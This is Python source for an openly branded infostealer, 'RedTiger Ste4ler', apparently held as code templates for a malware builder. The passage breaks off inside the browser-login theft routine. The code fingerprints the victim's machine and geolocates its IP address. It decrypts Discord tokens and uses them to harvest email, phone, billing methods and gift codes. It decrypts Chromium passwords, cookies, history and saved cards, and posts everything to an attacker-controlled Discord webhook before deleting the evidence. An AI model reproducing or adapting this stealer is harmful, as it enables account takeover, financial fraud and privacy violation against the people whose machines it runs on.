# Copyright (c) RedTiger (https://redtiger.shop)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

#    ╔════════════════════════════════════════════════════════════════════════════╗
#    ║ ! File detected by the antivirus, but be aware that there is no backdoor ! ║
#    ╚════════════════════════════════════════════════════════════════════════════╝


Obligatory = r'''
while True:
    import os
    try:
        import platform
        import ctypes
        from screeninfo import *
        import psutil
        import GPUtil
        import sqlite3
        from urllib.request import Request, urlopen
        import json
        from json import *
        import socket
        import requests
        from Crypto.Cipher import AES
        import subprocess
        import datetime
        import base64
        import re
        import string
        import win32api
        import discord
        from discord import Embed, File, SyncWebhook
        import sys
        import shutil
        from pathlib import Path
        from zipfile import ZipFile
        from win32crypt import CryptUnprotectData
        import uuid
        from PIL import ImageGrab
        import time
        import browser_cookie3
        import cv2
        import pyautogui
        import keyboard
        import threading
        from tkinter import messagebox
        break
    except:
        modules = [
            "--upgrade pip",
            "platform", "ctypes", "screeninfo", "psutil", "GPUtil", "sqlite3",
            "urllib3", "json", "socket", "requests", "pycryptodome", "subprocess",
            "datetime", "base64", "re", "string", "pypiwin32", "discord.py",
            "sys", "shutil", "pathlib", "uuid", "Pillow", "browser-cookie3",
            "opencv-python", "pyautogui", "keyboard", "tkinter"
        ]

        for module in modules:
            os.system(f"pip install {module}")

def B10ck_K3y(): pass
def Unb10ck_K3y(): pass
def B10ck_T45k_M4n4g3r(): pass
def B10ck_M0u53(): pass
def B10ck_W3b5it3(): pass
def St4rtup(): pass
def Sy5t3m_Inf0(): pass
def Op3n_U53r_Pr0fi13_53tting5(): pass
def Scr33n5h0t(): pass
def C4m3r4_C4ptur3(): pass
def Di5c0rd_T0k3n(): pass
def Br0w53r_5t341(): pass
def R0b10x_C00ki3(): pass
def F4k3_3rr0r(): pass
def Sp4m_0p3n_Pr0gr4m(): pass
def Shutd0wn(): pass
    
def Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

website = "redtiger.shop"
color_embed = 0xa80505
username_embed = 'RedTiger Ste4ler'
avatar_embed = 'https://media.discordapp.net/attachments/1185940734256357427/1252261629546987550/logo_redtiger.png?ex=66719306&is=66704186&hm=c0cdee4699eb76dd404125866c4130d77ed177426daf71d8c976e5bbcb44c6bd&=&format=webp&quality=lossless&width=810&height=810'
footer_text = f"RedTiger Ste4ler"
footer_embed = {
        "text": footer_text,
        "icon_url": avatar_embed,
        }
                 

try: hostname_pc = socket.gethostname()
except: hostname_pc = "None"

try: username_pc = os.getlogin()
except: username_pc = "None"

try: displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
except: displayname_pc = "None"

try: ip_address_public = requests.get('https://httpbin.org/ip').json()['origin']
except: ip_address_public = "None"

try:
    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).connect(('8.8.8.8', 80))  
    ip_address_ipv4 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM).getsockname()[0]
    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).close()
except: ip_address_ipv4 = "None"

try:
    ip_address_ipv6 = []
    all_interfaces = socket.getaddrinfo(socket.gethostname(), None)
    for interface in all_interfaces:
        if interface[0] == socket.AF_INET6:
            ip_address_ipv6.append(interface[4][0])
    ip_address_ipv6 = ' / '.join(ip_address_ipv6)
except:
    ip_address_ipv6 = "None"

try:
    try:
        response = requests.get(f"https://{website}/api/ip/ip={ip_address_public}")
        api = response.json()

        country = api['country']
        country_code = api['country_code']
        region = api['region']
        region_code = api['region_code']
        zip_postal = api['zip']
        city = api['city']
        latitude = api['latitude']
        longitude = api['longitude']
        timezone = api['timezone']
        isp = api['isp']
        org = api['org']
        as_number = api['as']
    except:
        response = requests.get(f"http://ip-api.com/json/{ip_address_public}")
        api = response.json()

        country = api['country']
        country_code = api['countryCode']
        region = api['regionName']
        region_code = api['region']
        zip_postal = api['zip']
        city = api['city']
        latitude = api['lat']
        longitude = api['lon']
        timezone = api['timezone']
        isp = api['isp']
        org = api['org']
        as_number = api['as']
except:
    country, country_code, region, region_code, city, zip_postal, latitude, longitude, timezone, isp, org, as_number = "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None"
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Sy5t3mInf0 = r'''
def Sy5t3m_Inf0():
    try: sy5t3m_1nf0 = {platform.system()}
    except: sy5t3m_1nf0 = "None"

    try: sy5t3m_v3r5i0n_1nf0 = platform.version()
    except: sy5t3m_v3r5i0n_1nf0 = "None"

    try: m4c_4ddr355 = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: m4c_4ddr355 = "None"

    try: hw1d = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except: hw1d = "None"

    try: r4m_1nf0 = round(psutil.virtual_memory().total / (1024**3), 2)
    except: r4m_1nf0 = "None"

    try: cpu_1nf0 = platform.processor()
    except: cpu_1nf0 = "None"

    try: cpu_c0r3_1nf0 = psutil.cpu_count(logical=False)
    except: cpu_c0r3_1nf0 = "None"

    try: gpu_1nf0 = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: gpu_1nf0 = "None"

    try:
        drives_info = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive_path = letter + ":\\"
                try:
                    free_bytes = ctypes.c_ulonglong(0)
                    total_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(drive_path), None, ctypes.pointer(total_bytes), ctypes.pointer(free_bytes))
                    total_space = total_bytes.value
                    free_space = free_bytes.value
                    used_space = total_space - free_space
                    drive_name = win32api.GetVolumeInformation(drive_path)[0]
                    drive = {
                        'drive': drive_path,
                        'total': total_space,
                        'free': free_space,
                        'used': used_space,
                        'name': drive_name,
                    }
                    drives_info.append(drive)
                except:
                    ()
            bitmask >>= 1

        d15k_5t4t5 = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for drive in drives_info:
            use_percent = (drive['used'] / drive['total']) * 100
            free_space_gb = "{:.2f}GO".format(drive['free'] / (1024 ** 3))
            total_space_gb = "{:.2f}GO".format(drive['total'] / (1024 ** 3))
            use_percent_str = "{:.2f}%".format(use_percent)
            d15k_5t4t5 += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(drive['drive'], 
                                                                   free_space_gb,
                                                                   total_space_gb,
                                                                   use_percent_str,
                                                                   drive['name'])
    except:
        d15k_5t4t5 = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        def is_portable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if is_portable():
            p14tf0rm_1nf0 = 'Pc Portable'
        else:
            p14tf0rm_1nf0 = 'Pc Fixed'
    except:
        p14tf0rm_1nf0 = "None"


    try:
        def get_resolution():
            hdc = ctypes.windll.user32.GetDC(0)
            width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8)  
            height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10)
            ctypes.windll.user32.ReleaseDC(0, hdc)
            return width, height

        for i, monitor in enumerate(get_monitors(), 1):
            if monitor.is_primary:
                width, height = get_resolution()
                name = monitor.name
                is_primary = 'Yes'

        m41n_5cr33n = f"""Name         : "{name}" 
Resolution   : "{width}x{height}"
Main Screen  : "{is_primary}"
"""
    except:
        m41n_5cr33n = "None"


    try:
        def get_resolution():
            hdc = ctypes.windll.user32.GetDC(0)
            width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8) 
            height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10) 
            ctypes.windll.user32.ReleaseDC(0, hdc)
            return width, height


        monitors = list(get_monitors())

        if len(monitors) > 1:

            monitors[1]

            width, height = get_resolution()

            s3c0nd_5cr33n =  f"""Name         : "{name}" 
Resolution   : "{width}x{height}"
Main Screen  : "No"
"""
        else:
            s3c0nd_5cr33n = 'None'
    except:
        s3c0nd_5cr33n = "None"


    def embed_system(webhook_url, title, fields, color, footer, username, avatar):

        embed_data = {
            'title': title,
            "fields": fields,
            'color': color,
            "footer": footer
        }


        data = {
            'embeds': [embed_data],
            'username': username,  
            'avatar_url': avatar
        }


        json_data = json.dumps(data)


        headers = {
            'Content-Type': 'application/json'
        }


        requests.post(webhook_url, data=json_data, headers=headers)

    title = f'System Info `{username_pc} "{ip_address_public}"`:'

    fields = [
    {"name": f":bust_in_silhouette: | User Pc:", "value": f"""```Name        : "{hostname_pc}"
Username    : "{username_pc}"
DisplayName : "{displayname_pc}"```""", "inline": False},

    {"name": f":computer: | System:", "value": f"""```Plateform    : "{p14tf0rm_1nf0}"
Exploitation : "{sy5t3m_1nf0} {sy5t3m_v3r5i0n_1nf0}"

HWID : "{hw1d}"
MAC  : "{m4c_4ddr355}"
CPU  : "{cpu_1nf0}, {cpu_c0r3_1nf0} Core"
GPU  : "{gpu_1nf0}"
RAM  : "{r4m_1nf0}Go"```""", "inline": False},

{"name": f":satellite: | Ip:", "value": f"""```
Public : "{ip_address_public}"
Local  : "{ip_address_ipv4}"
Ipv6   : "{ip_address_ipv6}"
Isp    : "{isp}"
Org    : "{org}"
As     : "{as_number}"```""", "inline": False},

{"name": f":minidisc: | Disk:", "value": f"""```{d15k_5t4t5}```""", "inline": False},

{"name": f":desktop: | Screen:", "value": f"""```Main Screen:
{m41n_5cr33n}

Secondary Screen:
{s3c0nd_5cr33n}```""", "inline": False},

{"name": f":map: | Location:", "value": f"""```Country   : "{country} ({country_code})"
Region    : "{region} ({region_code})"
Zip       : "{zip_postal}"
City      : "{city}"
Timezone  : "{timezone}"
Latitude  : "{latitude}"
Longitude : "{longitude}"
```""", "inline": False},

] 
    embed_system(w3bh00k_ur1, title, fields, color_embed, footer_embed, username_embed, avatar_embed)'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Di5c0rdT0k3n = r'''
def Di5c0rd_T0k3n():
    class D15c0rd:
        def __init__(self, w3bh00k):
            upload_t0k3n5(w3bh00k).upload()

    class extr4ct_t0k3n5:
        def __init__(self) -> None:
            self.base_url = "https://discord.com/api/v9/users/@me"
            self.appdata = os.getenv("localappdata")
            self.roaming = os.getenv("appdata")
            self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
            self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

            self.t0k3n5, self.uids = [], []

            self.extr4ct()

        def extr4ct(self) -> None:
            paths = {
                'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
                'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
                'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
                'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
                'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
                'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
                'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
                'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
                'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
                '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
                'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
                'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
                'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
                'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
                'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
                'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
                'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
                'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
                'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
                'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
                'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
            }

            for name, path in paths.items():
                if not os.path.exists(path):
                    continue
                _d15c0rd = name.replace(" ", "").lower()
                if "cord" in path:
                    if not os.path.exists(self.roaming+f'\\{_d15c0rd}\\Local State'):
                        continue
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.regexp_enc, line):
                                t0k3n = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
                                                         1]), self.get_master_key(self.roaming+f'\\{_d15c0rd}\\Local State'))

                                if self.validate_t0k3n(t0k3n):
                                    uid = requests.get(self.base_url, headers={
                                                       'Authorization': t0k3n}).json()['id']
                                    if uid not in self.uids:
                                        self.t0k3n5.append(t0k3n)
                                        self.uids.append(uid)

                else:
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for t0k3n in re.findall(self.regexp, line):
                                if self.validate_t0k3n(t0k3n):
                                    uid = requests.get(self.base_url, headers={
                                                       'Authorization': t0k3n}).json()['id']
                                    if uid not in self.uids:
                                        self.t0k3n5.append(t0k3n)
                                        self.uids.append(uid)

            if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                    for _file in files:
                        if not _file.endswith('.sqlite'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                            for t0k3n in re.findall(self.regexp, line):
                                if self.validate_t0k3n(t0k3n):
                                    uid = requests.get(self.base_url, headers={
                                                       'Authorization': t0k3n}).json()['id']
                                    if uid not in self.uids:
                                        self.t0k3n5.append(t0k3n)
                                        self.uids.append(uid)

        def validate_t0k3n(self, t0k3n5: str) -> bool:
            r = requests.get(self.base_url, headers={'Authorization': t0k3n5})

            if r.status_code == 200:
                return True

            return False

        def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()

            return decrypted_pass

        def get_master_key(self, path: str) -> str:
            if not os.path.exists(path):
                return

            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
                return

            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

            return master_key

    class upload_t0k3n5:
        def __init__(self, w3bh00k: str):
            self.t0k3n5 = extr4ct_t0k3n5().t0k3n5
            self.w3bh00k = SyncWebhook.from_url(w3bh00k)

        def upload(self):
            if not self.t0k3n5:
                return

            for t0k3n_d15c0rd in self.t0k3n5:
                user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': t0k3n_d15c0rd}).json()

                try: u53rn4m3_d15c0rd = user['username'] + ' / ' + user['discriminator']
                except: u53rn4m3_d15c0rd = "None"

                try: d15pl4y_n4m3_d15c0rd = user['global_name']
                except: d15pl4y_n4m3_d15c0rd = "None"

                try: us3r_1d_d15c0rd = user['id']
                except: us3r_1d_d15c0rd = "None"

                try: em4i1_d15c0rd = user['email']
                except: em4i1_d15c0rd = "None"
                
                try: ph0n3_d15c0rd = user['phone']
                except: ph0n3_d15c0rd = "None"
                
                try: mf4_d15c0rd = user['mfa_enabled']
                except: mf4_d15c0rd = "None"
                
                try: c0untry_d15c0rd = user['locale']
                except: c0untry_d15c0rd = "None"

                try: av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{user['avatar']}.png"
                except: av4t4r_ur1_d15c0rd = avatar_embed

                try:
                    if user['premium_type'] == 0:
                        n1tr0_d15c0rd = 'False'
                    elif user['premium_type'] == 1:
                        n1tr0_d15c0rd = 'Nitro Classic'
                    elif user['premium_type'] == 2:
                        n1tr0_d15c0rd = 'Nitro Boosts'
                    elif user['premium_type'] == 3:
                        n1tr0_d15c0rd = 'Nitro Basic'
                    else:
                        n1tr0_d15c0rd = 'False'
                except:
                    n1tr0_d15c0rd = "None"

                try:
                    bi0_d15c0rd = user['bio']
                    if not bi0_d15c0rd.strip() or bi0_d15c0rd.isspace():
                        bi0_d15c0rd = "None"
                except:
                    bi0_d15c0rd = "None"

                try:
                    guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': t0k3n_d15c0rd})
                    if guilds_response.status_code == 200:
                        guilds = guilds_response.json()
                        try:
                            owner_guilds = [guild for guild in guilds if guild['owner']]
                            own3r_gui1d_c0unt = len(owner_guilds)
                            own3r_gui1d_n4m35 = [] 
                            if owner_guilds:
                                for guild in owner_guilds:
                                    own3r_gui1d_n4m35.append(f"{guild['name']} ({guild['id']}) / ")
                                own3r_gui1d_n4m35 = "\n" + "\n".join(own3r_gui1d_n4m35)
                        except:
                            own3r_gui1d_c0unt = "None"
                            own3r_gui1d_n4m35 = "None" 
                except:
                    own3r_gui1d_c0unt = "None"
                    own3r_gui1d_n4m35 = "None"
            
                try:
                    billing_d15c0rd = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': t0k3n_d15c0rd}).json()
                    if billing_d15c0rd:
                        p4ym3nt_m3th0d5_d15c0rd = []

                        for method in billing_d15c0rd:
                            if method['type'] == 1:
                                p4ym3nt_m3th0d5_d15c0rd.append('CB')
                            elif method['type'] == 2:
                                p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
                            else:
                                p4ym3nt_m3th0d5_d15c0rd.append('Other')
                        p4ym3nt_m3th0d5_d15c0rd = ' / '.join(p4ym3nt_m3th0d5_d15c0rd)
                    else:
                        p4ym3nt_m3th0d5_d15c0rd = "None"
                except:
                    p4ym3nt_m3th0d5_d15c0rd = "None"

                try:
                    g1ft_c0d35 = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': t0k3n_d15c0rd}).json()
                    if g1ft_c0d35:
                        codes = []
                        for g1ft_c0d35_d15c0rd in g1ft_c0d35:
                            name = g1ft_c0d35_d15c0rd['promotion']['outbound_title']
                            g1ft_c0d35_d15c0rd = g1ft_c0d35_d15c0rd['code']
                            data = f"Gift: {name}\nCode: {g1ft_c0d35_d15c0rd}"
                            if len('\n\n'.join(g1ft_c0d35_d15c0rd)) + len(data) >= 1024:
                                break
                            g1ft_c0d35_d15c0rd.append(data)
                        if len(g1ft_c0d35_d15c0rd) > 0:
                            g1ft_c0d35_d15c0rd = '\n\n'.join(g1ft_c0d35_d15c0rd)
                        else:
                            g1ft_c0d35_d15c0rd = "None"
                    else:
                        g1ft_c0d35_d15c0rd = "None"
                except:
                    g1ft_c0d35_d15c0rd = "None"

                embed = Embed(title=f'Discord Token `{username_pc} "{ip_address_public}"`:', color=color_embed)
                embed.set_thumbnail(url=av4t4r_ur1_d15c0rd)
                embed.add_field(name=":bust_in_silhouette: | Username:",
                                value=f"```{u53rn4m3_d15c0rd}```", inline=True)
                embed.add_field(name=":bust_in_silhouette: | Display Name:",
                                value=f"```{d15pl4y_n4m3_d15c0rd}```", inline=True)
                embed.add_field(name=":robot: | Id:",
                                value=f"```{us3r_1d_d15c0rd}```", inline=True)
                embed.add_field(name=":e_mail: | Email:",
                                value=f"```{em4i1_d15c0rd}```", inline=True)
                embed.add_field(name=":telephone_receiver: | Phone:",
                                value=f"```{ph0n3_d15c0rd}```", inline=True)   
                embed.add_field(name=":globe_with_meridians: | Token:",
                                value=f"```{t0k3n_d15c0rd}```", inline=True)
                embed.add_field(name=":rocket: | Nitro:",
                                value=f"```{n1tr0_d15c0rd}```", inline=True)
                embed.add_field(name=":earth_africa: | Language:",
                                value=f"```{c0untry_d15c0rd}```", inline=True)
                embed.add_field(name=":moneybag: | Billing:",
                                value=f"```{p4ym3nt_m3th0d5_d15c0rd}```", inline=True)
                embed.add_field(name=":gift: | Gift Code:",
                                value=f"```{g1ft_c0d35_d15c0rd}```", inline=True)
                embed.add_field(name=":lock: | Multi-Factor Authentication:",
                                value=f"```{mf4_d15c0rd}```", inline=True)
                embed.add_field(name=":identification_card: | Bio:",
                                value=f"```{bi0_d15c0rd}```", inline=True)
                embed.add_field(name=f":link: | Owner Guilds ({own3r_gui1d_c0unt}):",
                                value=f"```{own3r_gui1d_n4m35}```", inline=True)

                embed.set_footer(text=footer_text, icon_url=avatar_embed)

                self.w3bh00k.send(embed=embed, username=username_embed,
                                  avatar_url=avatar_embed)

    D15c0rd(w3bh00k_ur1)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Br0w53r5t341 = r'''
def Br0w53r_5t341():
    __LOGINS__ = []
    __COOKIES__ = []
    __WEB_HISTORY__ = []
    __DOWNLOADS__ = []
    __CARDS__ = []

    class Br0w53r:
        def __init__(self, w3bh00k):
            self.w3bh00k = SyncWebhook.from_url(w3bh00k)

            Chromium()
            Upload(self.w3bh00k)


    class Upload:

        def __init__(self, w3bh00k: SyncWebhook):
            self.w3bh00k = w3bh00k

            self.write_files()
            self.send()
            self.clean()

        def write_files(self):
            os.makedirs(f"Browsers_{username_pc}", exist_ok=True)
            if __LOGINS__:
                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_passwords.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __LOGINS__))

            if __COOKIES__:
                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_cookies.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __COOKIES__))

            if __WEB_HISTORY__:
                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_history.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

            if __DOWNLOADS__:
                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_downloads.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __DOWNLOADS__))

            if __CARDS__:
                with open(f"Browsers_{username_pc}\\browsers_{username_pc}_cards.txt", "w", encoding="utf-8") as f:
                    f.write('\n'.join(str(x) for x in __CARDS__))

            with ZipFile(f"Browsers_{username_pc}.zip", "w") as zip:
                for file in os.listdir(f"Browsers_{username_pc}"):
                    zip.write(f"Browsers_{username_pc}\\{file}", file)

        def send(self):
            self.w3bh00k.send(
                embed=Embed(
                    title=f"Browser Steal `{username_pc} \"{ip_address_public}\"`:",
                    description="```" +
                    '\n'.join(self.tree(Path(f"Browsers_{username_pc}"))) + "```",
                    color=color_embed,
                ).set_footer(
                     text=footer_text,
                     icon_url=avatar_embed
                ),
                file=File(f"Browsers_{username_pc}.zip"),
                username=username_embed,
                avatar_url=avatar_embed,
            )

        def clean(self):
            shutil.rmtree(f"Browsers_{username_pc}")
            os.remove(f"Browsers_{username_pc}.zip")

        def tree(self, path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
            pipes = {
                'space':  '    ',
                'branch': '│   ',
                'tee':    '├── ',
                'last':   '└── ',
            }

            if prefix == '':
                yield midfix_folder + path.name

            contents = list(path.iterdir())
            pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
            for pointer, path in zip(pointers, contents):
                if path.is_dir():
                    yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                    extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                    yield from self.tree(path, prefix=prefix+extension)
                else:
                    yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
        

    class Chromium:

        def __init__(self):
            self.appdata = os.getenv('LOCALAPPDATA')
            self.browsers = {
                'amigo': self.appdata + '\\Amigo\\User Data',
                'torch': self.appdata + '\\Torch\\User Data',
                'kometa': self.appdata + '\\Kometa\\User Data',
                'orbitum': self.appdata + '\\Orbitum\\User Data',
                'cent-browser': self.appdata + '\\CentBrowser\\User Data',
                '7star': self.appdata + '\\7Star\\7Star\\User Data',
                'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
                'vivaldi': self.appdata + '\\Vivaldi\\User Data',
                'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
                'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
                'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
                'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
                'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
                'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
                'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
                'iridium': self.appdata + '\\Iridium\\User Data',
            }
            self.profiles = [
                'Default',
                'Profile 1',
                'Profile 2',
                'Profile 3',
                'Profile 4',
                'Profile 5',
            ]

            for _, path in self.browsers.items():
                if not os.path.exists(path):
                    continue

                self.master_key = self.get_master_key(f'{path}\\Local State')
                if not self.master_key:
                    continue

                for profile in self.profiles:
                    if not os.path.exists(path + '\\' + profile):
                        continue

                    operations = [
                        self.get_login_data,
                        self.get_cookies,
                        self.get_web_history,
                        self.get_downloads,
                        self.get_credit_cards,
                    ]

                    for operation in operations:
                        try:
                            operation(path, profile)
                        except:
                            pass

        def get_master_key(self, path: str) -> str:
            if not os.path.exists(path):
                return

            if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
                return

            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

        def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()

            return decrypted_pass

        def get_login_data(self, path: str, profile: str):
            login_db = f'{path}\\{profile}\\Login Data'
            if not os.path.exists(login_db):
                return

            shutil.copy(login_db, 'login_db')
            conn = sqlite3.connect('login_db')
            cursor = conn.cursor()
